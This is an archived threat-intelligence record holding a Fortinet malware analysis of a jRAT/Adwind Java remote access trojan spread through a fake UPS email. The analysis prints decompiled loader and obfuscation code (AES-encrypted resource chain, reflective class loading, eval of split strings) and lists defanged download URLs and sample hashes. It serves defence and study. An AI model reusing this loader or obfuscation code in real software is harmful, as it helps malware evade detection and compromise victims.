{
    "id": "161b0b70-05b6-4473-9144-294343c3052b",
    "created_at": "2023-01-12T15:03:43.864822Z",
    "updated_at": "2025-03-27T02:05:42.845951Z",
    "deleted_at": null,
    "sha1_hash": "f8cb4774757f300a49a30de4a26c076a0d87c77f",
    "title": "2018-02-16 - New jRAT-Adwind Variant Being Spread With Package Delivery Scam",
    "authors": "",
    "file_creation_date": "2022-05-29T10:40:57Z",
    "file_modification_date": "2022-05-29T10:40:57Z",
    "file_size": 396304,
    "plain_text": "# New jRAT/Adwind Variant Being Spread With Package Delivery Scam\n\n**[fortinet.com/blog/threat-research/new-jrat-adwind-variant-being-spread-with-package-delivery-scam.html](https://www.fortinet.com/blog/threat-research/new-jrat-adwind-variant-being-spread-with-package-delivery-scam.html)**\n\nFebruary 16, 2018\n\n\n-----\n\n-----\n\nThreat Research\n\nBy [Xiaopeng Zhang | February 16, 2018](https://www.fortinet.com/blog/search?author=Xiaopeng+Zhang)\nAt the beginning of February 2018, FortiGuard Labs collected a malicious email with the\nsubject “UPS DELIVERY UPDATE”, as shown in Figure 1. Phishers and scammers\ntraditionally misuse the names of well-known organizations and individuals in order to make\ntheir malicious messages seem legitimate, allowing them to more easily trick unsuspecting\nvictims. This email message contains a fake order tracking number with a bogus hyperlink\nthat, rather than connecting the user to a legitimate website, downloads a jar malware. After\na quick analysis, I was able to determine that this malware is jRAT/Adwind.\n\n[jRAT (also called Adwind) is a commercial cross-platform remote access Trojan that is](http://jrat.io/)\nwritten in Java. It is designed to control and collect data from a victim’s machine regardless\nof whether it is running Windows, Linux, Mac OS X, or BSD. While jRAT is not very new, it\nkeeps upgrading its technology. In this blog, I will show you how this variant that we collected\nworks on a Windows system.\n\n## Downloading the jRAT malware from the hyperlink\n\nFigure 1 shows the content of the fake UPS email. The hyperlink on the order tracking\nnumber points to the malware download page “hxxp://upsshippingilabel.4pu.com/”. Note that\na real UPS tracking link should be in this format:\n\"hxxp://www.ups.com/WebTracking/processInputRequest?\nloc=en_US&Requester=NES&tracknum=1Z5F606X123456789”.\n\nFigure 1. Fake UPS shipment notice\n\nFigure 2. Downloading the jRAT malware in IE\n\nAs you can see from Figure 2, the downloaded file is named “upslabels.jar”.\n\nA Jar file is a Java package format file that can be executed by a Java.exe program. This\nmeans that to get this malware running, the victim has to have installed the Java running\nenvironment on his system.\n\n## Static analysis of the upslabels.jar file (the parent-jar)\n\nWhen dragging the jar file into a Java static analysis tool, it’s obvious that it uses obfuscation\ntechnology to protect it from being easily analyzed. The package names, class names,\nfunction names, field names, and resource names are all random strings. It even could\nbypass the JD-GUI tool because the jar’s entry function - main function is decompiled as\nempty in the tools. Figure 3 shows the view of “usplabels.jar” in an analysis tool.\n\nFigure 3. Random names and empty main function in JD-GUI\n\n\n-----\n\nI was able to decompile the jar file into Java source code so I could debug the source code in\nEclipse. BTW, when the upslabels.jar starts, it drops another jar file. So I call the\nupslabels.jar the parent-jar. It is actually like a packer for PE files. I then call the dropped jar\nfile the main-jar.\n\nTo make it hard to be analyzed, all the constant strings in it are split and defined into many\ndifferent classes, all of which will be concatenated during runtime. Below are two code\nsnippets displaying how the split strings are defined, and how one split string is\nconcatenated.\n```\npublic class Unmedaled\n{\n[…]\n public static void hayneTech()\n {\n  Unpeg.difdaBruzz = \"com.oofiest.flatterer.Shreds.get\";\n  Unpeg.noxChoop = \"BuggyAlogy(), com.\";\n  Unpeg.corrBlimy = \"miesFubs(), com.ch\";\n  Unpeg.jismDupe = \"stils.Un\";\n  Unpeg.mhoAevum = \"m.cholle\";\n  Unpeg.thyselBazar = \"AES\";\n  Unpeg.mendeeHunh = \"AES\";\n  Unpeg.boohooTalked = \"\\0002216ca4\";\n  Unpeg.rebelWasir = \"st/oe\";\n  Unpeg.pnyxLwo = \"l.Jrat\";\n }\n}\npublic class NeukBons\n{\n[…]\n public static void huminEntr()\n {\n  Unpeg.dartreJazy = (new\nStringBuilder()).append(Unpeg.difdaBruzz).append(Unpeg.simasHaul).append(Unpeg.pindaHowso).append(Unpeg.foun\n }\n}\n\n```\nPart of the split strings will be combined as Java code to be executed later by a ScriptEngine\nobject by calling its eval function. It also attempts to hide the keyword code. Below is an\nexample of calling eval function:\n```\npublic static void unrowWote() throws ScriptException\n{\n AeacusAdm.abyChm.eval(Unpeg.keltsKru);  \n} \n\n```\n\n-----\n\n[AeacusAdm.abyChm is a ScriptEngine object. Unpeg.keltsKru is a String type variable](https://docs.oracle.com/javase/7/docs/api/javax/script/ScriptEngine.html)\nthat holds the concatenated string of\n“com.oofiest.RectaSeers.pedeeGunsel=com.choller.pastils.Unpeg.getAtaPawls().getBytes();”,\nwhich is then executed in the AeacusAdm.abyChm.eval function. The result is an AES key\nused to decrypt other classes, so the key is saved in the variable\ncom.oofiest.RectaSeers.pedeeGunsel with the value [0, 50, 50, 49, 54, 99, 97, 52, 51, 55,\n98, 52, 52, 52, 53, 0].\n\nThis variant also contains a lot of resource files (see the file list in Figure 3), which are\nencrypted. The parent-jar reads and decrypts them, and then some of them will be combined\nas Java class files, constant strings, or URL strings.\n\n## Dynamic analysis of the upslabels.jar file\n\nNext, I will provide more details about how this variant works chronologically.\n\nWhen started with Java.exe, this variant sets up two JVM global properties, \"q.main-class\">\"operational.Jrat\" and \"q.encryptedPathsPath\"->\"/com/choller/LidoMath\", by calling the\nSystem.setProperty function. The value of the property “q.main-class” is retrieved later in a\ndynamically generated class to load the main class. The value of the property\n“q.encryptedPathsPath” is \"/com/choller/LidoMath\", which is the first element of an encrypted\nresource chain.\n\nFigure 4. Calling System.setProperty\n\nIt then loads data from a resource file and decrypts it using the AES algorithm to get a class\nfile. It will be a dynamic class to be loaded as “qeaqtor.Loader” by calling the\nClassLoader.defineClass method. Figure 5 shows the main steps to loading dynamic class\n“qeaqtor.Loader”. I added comments to the code for better understanding.\n\nFigure 5. Load dynamic class qeaqtor.Loader\n\nAfter that, the “Loader” class in package “qeaqtor” is ready to be used. It contains four\nmethods: bytes, criminal, go and resource. Only go is declared as “public static”. The go\nmethod is the entry method of this class. It’s obtained from the result of calling\nqeaqtor.Loader.class.getMethods() and returns with a method array, the first of which is\nmethod go. I dumped the class to a local file and then decompiled it, so in the snippet below\nyou can see how the class qeaqtor.Loader and its member variables are declared, as well as\nthe code of method go.\n\n\n-----\n\n```\npackage qeaqtor;\nimport Java.io.ByteArrayInputStream;\nimport Java.io.ByteArrayOutputStream;\nimport Java.io.DataInputStream;\nimport Java.io.InputStream;\nimport Java.io.ObjectInputStream;\nimport Java.lang.reflect.Method;\nimport Java.util.LinkedHashMap;\nimport Java.util.zip.GZIPInputStream;\nimport Javax.crypto.Cipher;\nimport Javax.crypto.spec.SecretKeySpec;\npublic class Loader\n{\n public static final String[] qeaqtor_resources = { \"/qeaqtor/Loader.class\",\n\"/qeaqtor/URLStreamHandler.class\", \"/qeaqtor/URLStreamHandlerFactory.class\",\n\"/qeaqtor/URLConnection.class\", \"/qeaqtor/Header.class\" };\n static String _main_class;\n static String _encryptedPathsPath;\n public static String entryKey = \"0123456789012345\";//AES key\n\n```\n\n-----\n\n```\nstatic Class bootsrapClass;\nstatic LinkedHashMap<String, byte[]> criminals;\nstatic LinkedHashMap<String, String[]> paths;\npublic static void go(Class bootsrapClass, String[] args) throws Throwable\n{\n if (args == null) {args = new String[0];} \n _main_class = System.getProperty(\"q.main-class\");\n _encryptedPathsPath = System.getProperty(\"q.encryptedPathsPath\");\n if (_main_class == null)\n return;     \n ByteArrayOutputStream mainBaos = new ByteArrayOutputStream();\n DataInputStream dis;  InputStream is;\n String nextPath = _encryptedPathsPath;\n for (;;){\n is = bootsrapClass.getResourceAsStream(nextPath); \n\n```\n\n-----\n\n```\n  if (is == null) break;\n  ByteArrayOutputStream baos = new ByteArrayOutputStream();\n  int readed;\n  byte[] buffer = new byte[1024];\n  while ((readed = is.read(buffer)) > -1)\n  baos.write(buffer, 0, readed);\n  byte[] encbytes = baos.toByteArray();\n  Cipher cipher = Cipher.getInstance(\"AES\");\n  cipher.init(2, new SecretKeySpec(entryKey.getBytes(\"UTF-8\"), \"AES\"));\n  encbytes = cipher.doFinal(encbytes);    \n  is = new ByteArrayInputStream(encbytes);\n  dis = new DataInputStream(is);       \n  nextPath = dis.readUTF();\n  while ((readed = dis.read(buffer)) > -1)\n  mainBaos.write(buffer, 0, readed); \n }      \n ObjectInputStream ois = new ObjectInputStream(new\nByteArrayInputStream(mainBaos.toByteArray()));\n paths = (LinkedHashMap)ois.readObject();\n\n```\n\n-----\n\n```\n criminals (LinkedHashMap)ois.readObject();\n ois.close();\n ClassLoader cl = bootsrapClass.getClassLoader();\nMethod defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\",\n       new Class[] {\n        String.class,\n         byte[].class,\n        Integer.TYPE,\n        Integer.TYPE }\n       );\n defineClass.setAccessible(true);\n String res[] = qeaqtor_resources;\n Class last = null;\n int i = 0; i = res.length;\n for (int j = 0; j < i;) {\n     String qc = res[j];\n     if ((i++ == 0) || !qc.endsWith(\".class\"))\n\n```\n\n-----\n\n```\n        continue;\n     is = null;\n     try {\n      String canname = qc.replace('/', '.');\n      canname = canname.substring(1, canname.length() - 6);\n       byte[] bytes = resource(qc);  \n       if ((last = (Class)defineClass.invoke(cl, new Object[] { canname, bytes,\nInteger.valueOf(0), Integer.valueOf(bytes.length) })) == null)\n       return;\n       try {is.close();} catch (Throwable localThrowable2) {}  \n      j++;\n      }\n      catch (Throwable t) { return; }\n      finally{\n         try {is.close();}  \n         catch (Throwable localThrowable4) {}\n        }\n\n```\n\n-----\n\n```\n     }  \n if (last == null) {return;}         \n last.getMethod(\"go\", new Class[] { String[].class })\n      .invoke(null, new Object[] { args });\n }\n[…]\n\n```\nHere it reads out \"/com/choller/LidoMath\" by calling function System.getProtperty() from the\nJVM global property \"q.encryptedPathsPath\". As I said above, this is the first element in a\nresource chain. It is a path to the AES encrypted resource file. After decrypting its content\nand calling nextPath = dis.readUTF(); it gets the next resource’s path from the decrypted\ndata. It also reads another global property value into the Loader class variable _main_class\nthat is used in the following dynamic loaded class.\n\nFigure 6 is the screenshot of the partially decrypted data. You can see\n\"/com/choler/BayaFinn\" will be the next one in the resource chain.\n\nFigure 6. Decrypted resource \"/com/choller/LidoMath\"\n\nIn this way, it can load all resources in the resource chain and then put the decrypted data\ntogether into a mainBaos object.\n\n[Actually, the final data could make a LinkedHashMap object, as it reads all data into a](https://docs.oracle.com/javase/8/docs/api/java/util/LinkedHashMap.html)\nLinkedHashMap object Loader.paths. From a Java document, the class is defined as “Class\nLinkedHashMap<K,V>”. This class contains two members, Key and Value. You get the Value\nby Key calling its get() function. In this case, the Value consists of the resource path and\nAES decryption key. In the following steps, using this LinkedHashMap object, the malware\ncan read and decrypt a number of resource files, including URL, more dynamic class files,\nand the dropped working jar file.\n\nFigure 7 shows one pair of K and V from the object paths. It contains 122 pairs of K and V.\n\nFigure 7. View of LinkedHashMap object paths\n\nLoader class has a class member qeaqtor_resources declared as the following:\n\n\n-----\n\n```\npublic static final String[] qeaqtor_resources\n= {\"/qeaqtor/Loader.class\", \"/qeaqtor/URLStreamHandler.class\",\n\"/qeaqtor/URLStreamHandlerFactory.class\", \"/qeaqtor/URLConnection.class\",\n\"/qeaqtor/Header.class\"};\n\n```\nIt’s a string array containing five strings, all of which are Keys in the paths object. The next\nstep in the go method is to load all of these classes except for the first one (it has already\nbeen loaded.). Through paths.get() we get the corresponding resource path and AES\ndecryption key to decrypt the resource loaded into JVM as class, just like loading the Loader\nclass. At the bottom of this function, it calls the last loaded class’s go() method by calling\n_getMethod(“go”…) and invoke(). The last loaded class is “/qeaqtor/Header.class”, which I_\nalso dumped to a local file for further analysis.\n\nLet’s move forward to see what Header.go method does. It calls the Loader.crimina(\"smart_qrypt-address\"); method to get a URL. Here “smart-qrypt-address\" is a Key in Loader.paths._\nIt ends up with the URL string\n\"hxxps://vvrhhhnaijyj6s2m.onion.top/storage/cryptOutput/0.81189400 1517566981.jar\". It\nthen accesses this URL and downloads a new file to replace the current parent-jar and run it.\nIn short, it upgrades itself every time it starts. Figure 8, below, contains the code snippet.\n\nFigure 8. Upgrades itself every time it starts up\n\nThe Header.go method continues to load the dynamic class whose name is in\n_Loader._main_class, i.e. “operational.Jrat\". It is formatted as_\n“criminal/0/operational/Jrat.class“. No doubt, it’s a Key to Loader.paths as well. The resource\nfile for this Key is “/com/choller/britchka/HiantPfc“. Decrypting it can get a class file, and then\nthe “operational.Jrat” class is loaded dynamically into this JVM. Below is the related code\nsnippet.\n\n\n-----\n\n```\nObject brother = new URLClassLoader(urls);\nClass sister = ((ClassLoader)brother).loadClass(Loader._main_class);\nsister.getMethod(\"main\", new Class[] { String[].class }).invoke(null, new Object[] {\nargs });\n\n```\nFinally, the function operational.Jrat.main will be called through calling invoke.\n\nThe purpose of the Jrat.main function is to drop another jar file into the system temp folder,\nwhich will take control to perform the actual malicious actions on the victim’s system. It is the\nmain-jar file. Similarly the main-jar file is encrypted and split into different resource files. It\ncan be restored through the Loader.paths. Figure 9, below, is the code snippet of\n_operation.Jrat.main that tells how the main-jar is restored and run up._\n\nFigure 9. Run main-jar up\n\nHere is a view of the overall flow chart of what upslabels.jar does.\n\nFigure 10. The overall flow chart of upslabels.jar execution\n\nWhen the main-jar runs, it adds itself into the startup group in the system registry so that it\nwill be run whenever the system starts. It also covertly runs two VBS scripts from the system\ntemp folder to get the installed AntiVirus and Firewall products on the system. Figure 11\nshows the process tree in Process Monitor when upslabels.jar runs.\n\nFigure 11. Process tree when running upslabels.jar\n\nSo far, I’m still working on analyzing the dropped main-jar.\n\nDuring my analysis, we also observed that there were many different jRAT variants captured\nin our malware collection system. The list below is a partial listing of them.\n\nD15DE96E4E287377491AAD6C29201F5D|Order_2018.jar\n\nAB679F467A773BB14E8C5812102DBCF5|Order_2018.jar\n\n\n-----\n\nAAF35F7D8C5D12BA595800287176336B|1Z2959990312036034.jar\n\nC66E26C585BA64AF4EE234787694B44C|Order_2018.jar\n\nAD63F38A172367CE5A0919A04968030E|Order_2018.jar\n\n212DD73E8896DA5F5F37E67A38B546FC|Order_2018.jar\n\nC87C87BAA62143EC219A204FA3AA2E48|Payment details.jar\n\n632AEFADDD6005C4F85616CDEA6BEE74|DOC0.14538400 1.jar\n\n15B9AE21D412ED477619F6E7B3CC43F6|Document.jar\n\n2395E2D206D002203965CF9C1D38906C|SOA.jar\n\n5FB5E4E13620DC2EC0B2D4E1F5E2B099|Order_2018.jar\n\n5E1D0FAAA0561E63069D26F69B8AB552|Order_2018.jar\n\n7454B206D9F8BDD0F99F8365E278A214|Invoice.jar\n\nDDFBFBE75F00047B6AA7129950A16CD8|New Order.jar\n\n## Solution\n\nThe FortiGuard Antivirus service has detected the file \"upslabels.jar\" as Java/Adwind.AAV!tr.\nThe jar download URL has been rated as Malicious Websites by the FortiGuard Webfilter\nservice.\n\n## IOC\n\nURL list:\n\nhxxp://upsshippingilabel.4pu.com/\n\nhxxps://vvrhhhnaijyj6s2m.onion.top/storage/cryptOutput/0.81189400 1517566981.jar\n\nSample SHA-256 hashes:\n\nupslabels.jar\n\n02A47E7FDFF641C9DE851D8434E4627E3E2BFB20FD0D776E8528DC719039AC36\n\n_[Sign up for our weekly FortiGuard intel briefs](https://fortiguard.com/resources/threat-brief)_ _or_ _to be a part of our_ _[open beta of Fortinet’s](https://tis.fortiguard.com/signup/)_\n_FortiGuard Threat Intelligence Service._\n\n## Related Posts\n\n\n-----\n\nCopyright © 2022 Fortinet, Inc. All Rights Reserved\n\n[Terms of ServicesPrivacy Policy](https://www.fortinet.com/corporate/about-us/legal.html)\n| Cookie Settings\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-02-16 - New jRAT-Adwind Variant Being Spread With Package Delivery Scam.pdf"
    ],
    "report_names": [
        "2018-02-16 - New jRAT-Adwind Variant Being Spread With Package Delivery Scam.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535823,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1653820857,
    "ts_modification_date": 1653820857,
    "files": {
        "pdf": "https://archive.orkl.eu/f8cb4774757f300a49a30de4a26c076a0d87c77f.pdf",
        "text": "https://archive.orkl.eu/f8cb4774757f300a49a30de4a26c076a0d87c77f.txt",
        "img": "https://archive.orkl.eu/f8cb4774757f300a49a30de4a26c076a0d87c77f.jpg"
    }
}